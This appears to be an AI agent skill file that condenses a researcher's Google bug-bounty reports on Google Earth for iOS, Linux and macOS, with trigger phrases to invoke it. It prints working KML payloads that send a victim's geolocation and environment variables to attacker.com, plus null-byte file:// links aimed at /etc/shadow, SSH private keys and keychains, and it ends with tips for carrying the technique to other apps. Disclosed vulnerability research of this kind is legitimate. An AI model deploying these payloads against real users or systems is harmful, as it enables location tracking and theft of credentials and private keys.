---
name: bughunters-earth
description: Personal Google VRP reports by omespino — Google Earth vulnerabilities across platforms. XSS in Google Earth iOS via KML CDATA onerror + precise geolocation exfiltration (navigator.geolocation). XSS + LFI in Google Earth Pro Linux via KML CDATA script src with relative path traversal (file:../../../etc/environment loaded as JS, PATH/JAVA_HOME exfiltrated). Arbitrary file read in Google Earth Pro macOS via null byte (%00) in Add Link UI (file:///etc/passwd%00.html bypasses extension filter). Spanish triggers — "google earth kml", "earth ios xss", "earth pro linux", "earth pro macos", "kml xss", "kml lfi", "google earth vulnerabilidad", "kml payload", "earth kml cdata".
---

## Reports: Google Earth vulnerabilities (omespino)

---

### Report 13 — XSS in Google Earth iOS via KML → geolocation exfiltration

**Target:** Google Earth iOS App v9.134.0 | **Delivery:** Google Drive link → "Open with Google Earth"

**KML payload (onerror on broken img src):**
```xml
<description><![CDATA[
  <img onerror='{
    navigator.geolocation.getCurrentPosition(function(position) {
      document.write("Lat: " + position.coords.latitude + " Lon: " + position.coords.longitude);
      document.write("<img src=http://attacker.com/?" + position.coords.latitude + "," + position.coords.longitude + ">");
    });
  }' src="./2.htm">
]]></description>
```
`src="./2.htm"` → relative path not found → `onerror` fires. Location prompt expected in maps apps → victim accepts.

---

### Report 11 — XSS + LFI in Google Earth Pro Linux via KML

**Target:** Google Earth Pro Desktop 7.3.4.8284 (Linux)

**KML payload (script src with relative path traversal):**
```xml
<Placemark>
  <description><![CDATA[
    <script src="file:../../../../../../../etc/environment"></script>
    <script>
      document.write('PATH var = ' + PATH);
      document.write('<img src="http://attacker.com/?path=' + PATH + '&java_home=' + JAVA_HOME + '">');
    </script>
  ]]></description>
</Placemark>
```
`/etc/environment` format (`VAR="value"`) is valid JS → vars become global scope.
Victim double-clicks `.kml` → Google Earth opens → clicks placemark → XSS + LFI fires.

---

### Report 14 — Arbitrary file read in Google Earth Pro macOS via null byte

**Target:** Google Earth Pro Desktop 7.3.3.7786 (macOS)

**In "Add Link" field when creating a Pin:**
```
<a href="file:///etc/passwd%00.html">passwd</a>
```
`%00` terminates string at OS level → OS reads `/etc/passwd`; `.html` extension passes app filter.

**More targets:**
```
file:///etc/shadow%00.jpg
file:///home/user/.ssh/id_rsa%00.png
file:///Users/user/Library/Keychains/login.keychain%00.html
```

---

## Google Earth XSS/LFI vector comparison

| Report | Platform | Vector | Technique |
|---|---|---|---|
| KML CDATA + script src | Desktop Linux | External KML | Relative path-traversal LFI |
| KML CDATA + onerror | iOS | KML via Drive | XSS + geolocation |
| Pin "Add Link" + %00 | Desktop macOS | App native UI | Null byte bypass in file:// |

**Generalization:** Desktop apps with embedded browsers (Electron, WebKit, CEF) often have `file://` access without modern restrictions. Test file formats that render HTML: `.kml`, `.gpx`, `.svg`, map files, rich documents.
